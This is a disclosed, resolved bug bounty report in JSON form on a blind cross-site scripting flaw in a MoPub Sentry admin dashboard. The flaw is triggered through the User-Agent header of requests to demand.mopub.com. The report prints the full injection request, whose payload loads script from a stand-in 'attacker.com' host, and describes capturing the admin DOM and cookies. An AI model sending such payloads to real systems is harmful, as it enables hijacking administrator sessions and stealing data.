{
  "id": 275518,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzU1MTg=",
  "url": "https://hackerone.com/reports/275518",
  "title": "Blind XSS in Mobpub Marketplace Admin Production | Sentry via demand.mopub.com (User-Agent)",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2017-10-08T15:56:22.379Z",
  "submitted_at": "2017-10-08T15:56:22.379Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "harisec",
    "url": "/harisec",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/968/7f3126cb24b0dd55034e93fb7e809df7e1000e77_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 61,
    "url": "https://hackerone.com/x",
    "handle": "x",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "X / xAI",
      "twitter_handle": "XSecurity",
      "website": "https://x.com",
      "about": "X helps you create and share ideas and information instantly, without barriers."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2018-02-17T06:15:52.724Z",
  "bug_reporter_agreed_on_going_public_at": "2018-02-17T06:15:52.589Z",
  "team_member_agreed_on_going_public_at": "2018-02-17T00:17:19.490Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:** \nI've identified a Blind XSS vulnerability that fires in the `Mobpub Marketplace Admin Production | Sentry` dashboard and can be triggered by sending a HTTPS request to an endpoint from the domain **demand.mopub.com**.\n\n**Description:** \nI've sent the following HTTPS request to the following URL `https://demand.mopub.com/accounts/login/`\n\n```\nGET /accounts/login/ HTTP/1.1\nReferer: 1\nUser-Agent: '>\"></title></style></textarea></script><script/src=attacker.com/js></script>\nX-Forwarded-For: 1\nHost: demand.mopub.com\nAccept-Encoding: gzip,deflate\nAccept: */*\nX-OrigHost: demand.mopub.com\n\n```\n\nPlease note that the value of the `User-Agent` header is set to an **Blind XSS payload** (I've used `attacker.com/js` as an example but initially it was set to an script loaded from my test domain `thx.bz`.\n\nSome time later after this initial request I've received two hits and the script from `thx.bz` was downloaded and executed. The script is configured to extract information from the browser context for demonstration purposes.\n\nI've extracted the content of the browser DOM (attached to this report as **DOM.html**) and other interesting information:\n\n**Dashboard Page URL**\n\n`http://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/`\n\n**User IP Address**\n`█████████`\n\n**Title**\n`Marketplace Admin Production | Sentry`\n\n**User-Agent**\n`█████████`\n\n**Cookies**\n`██████\n`\n \n**Execution Origin**\n`http://sentry-test.mopub.com`\n\nIf you open the attachment **DOM.html** in a browser and search for `thx.bz` you will see that the value of the `User-Agent` is reflected inside a `<option>` tag without proper encoding and it was possible to escape the context and inject an additional `SCRIPT` tag.\n\nThe IP address that was used to visit the dashboard is `███████` and I've verified that it belongs to Twitter.\n\n## Steps To Reproduce:\n\n- Send the following HTTPS request (while replacing `attacker.com/js` with a domain/URL you control and where you can inspect the web server logs).\n\n```\nGET /accounts/login/ HTTP/1.1\nReferer: 1\nUser-Agent: '>\"></title></style></textarea></script><script/src=attacker.com/js></script>\nX-Forwarded-For: 1\nHost: demand.mopub.com\nAccept-Encoding: gzip,deflate\nAccept: */*\nX-OrigHost: demand.mopub.com\n\n```\n\n- Login into `http://sentry-test.mopub.com/` using administrative credentials and visit the vulnerable URL \n`http://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/`.\n\n- At this point a script should be loaded from your domain (the one you've used instead of `attacker.com/js`).\n\n## Impact: \n\nAn attacker can gain access and execute arbitrary JavaScript code in the context of the administrative dashboard `Mobpub Marketplace Admin Production | Sentry`.\n\n## Supporting Material/References:\n\n  * List any additional material (e.g. screenshots, logs, etc.)\n\nI've attached the contents of browser DOM where the Blind XSS triggered (`DOM.html`), more information about the execution context `bxss-report.html` and screenshots from the the browser DOM.\n\n",
  "weakness": {
    "id": 62,
    "name": "Cross-site Scripting (XSS) - Stored"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 227288,
      "file_name": "bxss-admin-panel-screenshot-1.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/227/288/322a1c3f6b33f0eba77d6fc6e259cc9c976721b1/bxss-admin-panel-screenshot-1.png?response-content-disposition=attachment%3B%20filename%3D%22bxss-admin-panel-screenshot-1.png%22%3B%20filename%2A%3DUTF-8%27%27bxss-admin-panel-screenshot-1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSNYI7VZN%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T185417Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbbewhiU3zBN%2BCQWTO8eGmA5x4QoBqxyoHbFgt8ZUssAiBwrIEoI1x%2FOsHz0dOuCOdsm%2FZlR6RK%2BLLQaqLRs7JwmyqyBQgYEAMaDDAxMzYxOTI3NDg0OSIMlJPb6k5hZImbMNzxKo8F5JuEUVisfkBKtEH31%2FsUC9meNFhjz%2FNeBW0KkldVJ1ZjRA0VlIHICdgg%2BbyVy7h9pVQnCnNc5qYG3JxM0K9oaNXJYD%2Bf8tgcG7O%2FSwZXTI4CO2z4Qlg0LPvywAGFQLCahneJmYu8bJJ7njszufG9%2B4YrR4yKHmBXJpsFUNfxMxYKYysyWmLYDItbaaiyL01DxgZDNR7aqEC09kNVJ2vs%2BZbHBjjsp0cfNypYrIrq8sukxczsID9XF0c1fvwkNkP2YlmxLbvjqjmrM7bRo9TkmGW295R7FvNIuZa4Ni%2FX7ESHpuLobmYZsF5ffYmR2%2F8LKGrc%2BbfnYK4NUTzb0Ki5kRanFdg%2FxXPWwb5MVLL1Bw1B9%2FZmvyAURevX4JZ8449HzYmZP16LdLC6seZSe6blKDA2En6VX12ld6o2M0mvHeyUkoUdh40uwAnhvSmlLLA4cuSpWzuc8zm7lhTxqDEGljI1JICQ0cMU8Eq%2FG3Hs88SpVvwpvYmzkZo73ZlSi2tIf3%2BByfP7erM8bBHCxsS98PkIOnRqPNRifh412jxWkSkcB6VNnbuZQJiPpXILu2w8y7%2BF%2FVN8HfngvsxTKE330XRpx8w66KQE3dxp3SFv3JxVVSPKfacMcwvA0QKU3D5a2GNAPXlMB0l5E%2FjaMwptq5Z3TYPSMRPSAc22osLriYfJNDH6QzJ26Wydc2xzPjPq%2Bar13qrZtK%2FZcjJhVOv5CCvzLM2WGX5tD220Taxl4EvNySBlZEb5kTMzdSCWxtpc4ydPoc3FTmuAEVLQBWgeHctvXAulwGARW9%2FJXHrPo4oADvgG1VLcpLsAvWVZXpIKvYVmOIK9mnCXgCsVZx%2BopK7hp3qY%2FLiCziRGmZH2ujC9l8DGBjqyAQd5wok8MvbufE78aKvEuNkPKuENHYb2kkwey7vBp9uFQBNHuAa66kTg4KMQjvpwyCH7sNmwJWEhO6%2BMkOQBnkYWqhId3RuNI4LwzGWhK1UHOpnfdZzDIEuXq1UWp7%2F979QTUdW2mlbgAQLY4%2FrSnLww%2Bxh66aot6jRv9N2pxWKQTbtxMYql5EXJ73npR%2BLahQovEkCEXgmYDUiGMzn5J1GBJtH%2FDBT%2FbGI7YBWRsC3ENrQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b0ed26e20c2a07c311d05765cd91e03d094faf3d837cb0a5d75bebb64549ae40",
      "file_size": 123631,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 227289,
      "file_name": "bxss-admin-dom-injection-point.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/227/289/4285ff40239de68598499f5dfac3b52b9058ad25/bxss-admin-dom-injection-point.png?response-content-disposition=attachment%3B%20filename%3D%22bxss-admin-dom-injection-point.png%22%3B%20filename%2A%3DUTF-8%27%27bxss-admin-dom-injection-point.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSNYI7VZN%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T185417Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbbewhiU3zBN%2BCQWTO8eGmA5x4QoBqxyoHbFgt8ZUssAiBwrIEoI1x%2FOsHz0dOuCOdsm%2FZlR6RK%2BLLQaqLRs7JwmyqyBQgYEAMaDDAxMzYxOTI3NDg0OSIMlJPb6k5hZImbMNzxKo8F5JuEUVisfkBKtEH31%2FsUC9meNFhjz%2FNeBW0KkldVJ1ZjRA0VlIHICdgg%2BbyVy7h9pVQnCnNc5qYG3JxM0K9oaNXJYD%2Bf8tgcG7O%2FSwZXTI4CO2z4Qlg0LPvywAGFQLCahneJmYu8bJJ7njszufG9%2B4YrR4yKHmBXJpsFUNfxMxYKYysyWmLYDItbaaiyL01DxgZDNR7aqEC09kNVJ2vs%2BZbHBjjsp0cfNypYrIrq8sukxczsID9XF0c1fvwkNkP2YlmxLbvjqjmrM7bRo9TkmGW295R7FvNIuZa4Ni%2FX7ESHpuLobmYZsF5ffYmR2%2F8LKGrc%2BbfnYK4NUTzb0Ki5kRanFdg%2FxXPWwb5MVLL1Bw1B9%2FZmvyAURevX4JZ8449HzYmZP16LdLC6seZSe6blKDA2En6VX12ld6o2M0mvHeyUkoUdh40uwAnhvSmlLLA4cuSpWzuc8zm7lhTxqDEGljI1JICQ0cMU8Eq%2FG3Hs88SpVvwpvYmzkZo73ZlSi2tIf3%2BByfP7erM8bBHCxsS98PkIOnRqPNRifh412jxWkSkcB6VNnbuZQJiPpXILu2w8y7%2BF%2FVN8HfngvsxTKE330XRpx8w66KQE3dxp3SFv3JxVVSPKfacMcwvA0QKU3D5a2GNAPXlMB0l5E%2FjaMwptq5Z3TYPSMRPSAc22osLriYfJNDH6QzJ26Wydc2xzPjPq%2Bar13qrZtK%2FZcjJhVOv5CCvzLM2WGX5tD220Taxl4EvNySBlZEb5kTMzdSCWxtpc4ydPoc3FTmuAEVLQBWgeHctvXAulwGARW9%2FJXHrPo4oADvgG1VLcpLsAvWVZXpIKvYVmOIK9mnCXgCsVZx%2BopK7hp3qY%2FLiCziRGmZH2ujC9l8DGBjqyAQd5wok8MvbufE78aKvEuNkPKuENHYb2kkwey7vBp9uFQBNHuAa66kTg4KMQjvpwyCH7sNmwJWEhO6%2BMkOQBnkYWqhId3RuNI4LwzGWhK1UHOpnfdZzDIEuXq1UWp7%2F979QTUdW2mlbgAQLY4%2FrSnLww%2Bxh66aot6jRv9N2pxWKQTbtxMYql5EXJ73npR%2BLahQovEkCEXgmYDUiGMzn5J1GBJtH%2FDBT%2FbGI7YBWRsC3ENrQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dce5de4cbd5a6638c333b8aaf1fc0ca8d90a4c56926228da4d75b1595e03d9bc",
      "file_size": 192109,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 227290,
      "file_name": "bxss-admin-panel-screenshot-2.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/227/290/22f3f4bb5307baed5284740a28bd326214f0b9b2/bxss-admin-panel-screenshot-2.png?response-content-disposition=attachment%3B%20filename%3D%22bxss-admin-panel-screenshot-2.png%22%3B%20filename%2A%3DUTF-8%27%27bxss-admin-panel-screenshot-2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSNYI7VZN%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T185417Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbbewhiU3zBN%2BCQWTO8eGmA5x4QoBqxyoHbFgt8ZUssAiBwrIEoI1x%2FOsHz0dOuCOdsm%2FZlR6RK%2BLLQaqLRs7JwmyqyBQgYEAMaDDAxMzYxOTI3NDg0OSIMlJPb6k5hZImbMNzxKo8F5JuEUVisfkBKtEH31%2FsUC9meNFhjz%2FNeBW0KkldVJ1ZjRA0VlIHICdgg%2BbyVy7h9pVQnCnNc5qYG3JxM0K9oaNXJYD%2Bf8tgcG7O%2FSwZXTI4CO2z4Qlg0LPvywAGFQLCahneJmYu8bJJ7njszufG9%2B4YrR4yKHmBXJpsFUNfxMxYKYysyWmLYDItbaaiyL01DxgZDNR7aqEC09kNVJ2vs%2BZbHBjjsp0cfNypYrIrq8sukxczsID9XF0c1fvwkNkP2YlmxLbvjqjmrM7bRo9TkmGW295R7FvNIuZa4Ni%2FX7ESHpuLobmYZsF5ffYmR2%2F8LKGrc%2BbfnYK4NUTzb0Ki5kRanFdg%2FxXPWwb5MVLL1Bw1B9%2FZmvyAURevX4JZ8449HzYmZP16LdLC6seZSe6blKDA2En6VX12ld6o2M0mvHeyUkoUdh40uwAnhvSmlLLA4cuSpWzuc8zm7lhTxqDEGljI1JICQ0cMU8Eq%2FG3Hs88SpVvwpvYmzkZo73ZlSi2tIf3%2BByfP7erM8bBHCxsS98PkIOnRqPNRifh412jxWkSkcB6VNnbuZQJiPpXILu2w8y7%2BF%2FVN8HfngvsxTKE330XRpx8w66KQE3dxp3SFv3JxVVSPKfacMcwvA0QKU3D5a2GNAPXlMB0l5E%2FjaMwptq5Z3TYPSMRPSAc22osLriYfJNDH6QzJ26Wydc2xzPjPq%2Bar13qrZtK%2FZcjJhVOv5CCvzLM2WGX5tD220Taxl4EvNySBlZEb5kTMzdSCWxtpc4ydPoc3FTmuAEVLQBWgeHctvXAulwGARW9%2FJXHrPo4oADvgG1VLcpLsAvWVZXpIKvYVmOIK9mnCXgCsVZx%2BopK7hp3qY%2FLiCziRGmZH2ujC9l8DGBjqyAQd5wok8MvbufE78aKvEuNkPKuENHYb2kkwey7vBp9uFQBNHuAa66kTg4KMQjvpwyCH7sNmwJWEhO6%2BMkOQBnkYWqhId3RuNI4LwzGWhK1UHOpnfdZzDIEuXq1UWp7%2F979QTUdW2mlbgAQLY4%2FrSnLww%2Bxh66aot6jRv9N2pxWKQTbtxMYql5EXJ73npR%2BLahQovEkCEXgmYDUiGMzn5J1GBJtH%2FDBT%2FbGI7YBWRsC3ENrQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f46676e6f0dd34b8a63e241db47531aa12a5005a6d01e22ceaeae676de1976c4",
      "file_size": 137487,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 227292,
      "file_name": "DOM.html",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/227/292/4a6ce7c02f3f74886ac677c0db388a10c08d8d7c/DOM.html?response-content-disposition=attachment%3B%20filename%3D%22DOM.html%22%3B%20filename%2A%3DUTF-8%27%27DOM.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSNYI7VZN%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T185417Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbbewhiU3zBN%2BCQWTO8eGmA5x4QoBqxyoHbFgt8ZUssAiBwrIEoI1x%2FOsHz0dOuCOdsm%2FZlR6RK%2BLLQaqLRs7JwmyqyBQgYEAMaDDAxMzYxOTI3NDg0OSIMlJPb6k5hZImbMNzxKo8F5JuEUVisfkBKtEH31%2FsUC9meNFhjz%2FNeBW0KkldVJ1ZjRA0VlIHICdgg%2BbyVy7h9pVQnCnNc5qYG3JxM0K9oaNXJYD%2Bf8tgcG7O%2FSwZXTI4CO2z4Qlg0LPvywAGFQLCahneJmYu8bJJ7njszufG9%2B4YrR4yKHmBXJpsFUNfxMxYKYysyWmLYDItbaaiyL01DxgZDNR7aqEC09kNVJ2vs%2BZbHBjjsp0cfNypYrIrq8sukxczsID9XF0c1fvwkNkP2YlmxLbvjqjmrM7bRo9TkmGW295R7FvNIuZa4Ni%2FX7ESHpuLobmYZsF5ffYmR2%2F8LKGrc%2BbfnYK4NUTzb0Ki5kRanFdg%2FxXPWwb5MVLL1Bw1B9%2FZmvyAURevX4JZ8449HzYmZP16LdLC6seZSe6blKDA2En6VX12ld6o2M0mvHeyUkoUdh40uwAnhvSmlLLA4cuSpWzuc8zm7lhTxqDEGljI1JICQ0cMU8Eq%2FG3Hs88SpVvwpvYmzkZo73ZlSi2tIf3%2BByfP7erM8bBHCxsS98PkIOnRqPNRifh412jxWkSkcB6VNnbuZQJiPpXILu2w8y7%2BF%2FVN8HfngvsxTKE330XRpx8w66KQE3dxp3SFv3JxVVSPKfacMcwvA0QKU3D5a2GNAPXlMB0l5E%2FjaMwptq5Z3TYPSMRPSAc22osLriYfJNDH6QzJ26Wydc2xzPjPq%2Bar13qrZtK%2FZcjJhVOv5CCvzLM2WGX5tD220Taxl4EvNySBlZEb5kTMzdSCWxtpc4ydPoc3FTmuAEVLQBWgeHctvXAulwGARW9%2FJXHrPo4oADvgG1VLcpLsAvWVZXpIKvYVmOIK9mnCXgCsVZx%2BopK7hp3qY%2FLiCziRGmZH2ujC9l8DGBjqyAQd5wok8MvbufE78aKvEuNkPKuENHYb2kkwey7vBp9uFQBNHuAa66kTg4KMQjvpwyCH7sNmwJWEhO6%2BMkOQBnkYWqhId3RuNI4LwzGWhK1UHOpnfdZzDIEuXq1UWp7%2F979QTUdW2mlbgAQLY4%2FrSnLww%2Bxh66aot6jRv9N2pxWKQTbtxMYql5EXJ73npR%2BLahQovEkCEXgmYDUiGMzn5J1GBJtH%2FDBT%2FbGI7YBWRsC3ENrQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9892ba6f3fc1f8d1cd0b48dd9d1446d59c13e522e2ca70c4b6bcf5ef21374ed5",
      "file_size": 69026,
      "type": "text/html",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2018-03-19T00:17:19.600Z",
  "allow_singular_disclosure_after": -237062217.69488502,
  "singular_disclosure_allowed": true,
  "vote_count": 63,
  "voters": [
    "jokebookservice1",
    "badf00d",
    "jensec",
    "ramsexy",
    "europa",
    "bogdantc",
    "muon4",
    "ali",
    "yumi",
    "tess",
    "and 53 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 1074,
    "asset_type": "URL",
    "asset_identifier": "mopub.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
